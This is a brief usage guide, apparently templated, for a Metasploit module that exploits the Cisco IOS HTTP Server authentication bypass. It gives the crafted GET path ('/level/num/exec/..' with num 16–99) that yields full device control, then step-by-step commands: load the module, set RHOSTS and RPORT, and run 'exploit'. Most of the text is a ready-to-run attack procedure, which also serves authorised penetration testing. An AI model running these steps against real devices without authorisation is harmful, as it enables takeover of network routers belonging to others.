**The description of current metasploit exploit**
This module exploits a vulnerability in the Cisco IOS HTTP Server.          By sending a GET request for "/level/num/exec/..", where num is between          16 and 99, it is possible to bypass authentication and obtain full system          control. IOS 11.3 -> 12.2 are reportedly vulnerable. This module          tested successfully against a Cisco 1600 Router IOS v11.3(11d).

---

**The usage instruction:**

Start by loading the module:

```bash
use auxiliary/scanner/http/cisco_ios_auth_bypass
```

Then set the required options:

```bash
# Required parameters with no default value
set RHOSTS <your target host(s) here>
# Repeat for each required parameter from Step 1
```

Carefully review the following network-related parameters. These have default values but **may need to be changed** depending on your environment:

* RPORT – default: 80 - The target port (TCP)

If the defaults match your setup, you do **not** need to change them. Otherwise, override them using `set`.

Finally, run the exploit:

```bash
exploit
```
Note:
1. Please execute the command step by step.
2. You can change default value if need.
3. You need to pay attention to whether the default RPORT is consistent with the port where the current service is running.